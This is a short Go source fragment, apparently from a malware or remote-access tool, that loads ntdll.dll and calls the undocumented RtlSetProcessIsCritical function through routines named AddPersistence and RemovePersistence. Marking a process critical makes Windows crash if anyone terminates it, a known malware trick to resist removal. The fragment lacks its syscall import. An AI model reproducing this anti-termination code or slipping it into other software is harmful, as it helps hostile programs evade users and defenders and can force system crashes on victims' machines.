package main

var (
	user32                  = syscall.NewLazyDLL("ntdll.dll")
	rtlSetProcessIsCritical = user32.NewProc("RtlSetProcessIsCritical")
)

func AddPersistence() {
	rtlSetProcessIsCritical.Call(1, 0, 0)
}

func RemovePersistence() {
	rtlSetProcessIsCritical.Call(0, 0, 0)
}
